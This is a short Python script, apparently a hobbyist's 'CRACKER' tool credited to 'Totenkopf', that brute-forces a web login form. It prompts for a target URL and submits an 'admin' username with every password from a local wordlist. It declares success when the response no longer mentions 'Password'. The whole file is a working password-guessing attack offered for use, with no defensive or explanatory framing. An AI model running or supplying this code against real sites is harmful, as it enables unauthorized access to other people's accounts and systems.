#!usr/bin/env python

import requests
import subprocess
from colorama import Fore

subprocess.call("clear")

logo = f"""

.------..------..------..------..------..------..------.
|C.--. ||R.--. ||A.--. ||C.--. ||K.--. ||E.--. ||R.--. |
| :/\: || :(): || (\/) || :/\: || :/\: || (\/) || :(): |
| :\/: || ()() || :\/: || :\/: || :\/: || :\/: || ()() |
| '--'C|| '--'R|| '--'A|| '--'C|| '--'K|| '--'E|| '--'R|
`------'`------'`------'`------'`------'`------'`------'

Created by {Fore.LIGHTRED_EX}Totenkopf
{Fore.LIGHTGREEN_EX}-----------------------------------------------------------
"""

print(f"{Fore.LIGHTGREEN_EX}{logo}\n")

target_url = input(f"{Fore.LIGHTWHITE_EX}Target url: ")
print("")
dict = {"username":"admin", "password":"", "Login":"submit"}
response = requests.post(target_url, data=dict)
# print(response.content)

with open("/root/PycharmProjects/force_login/passwords.txt", "r") as wordlist:
    for line in wordlist:
        word = line.strip()
        dict["password"] = word
        response = requests.post(target_url, data=dict)
        print(word)
        if "Password" not in str(response.content):
            print(f"\n{Fore.LIGHTCYAN_EX}[+] Logged in successfully, password: {Fore.LIGHTGREEN_EX}{word}\n")
            exit()

print("\n[+] Reached end of line\n")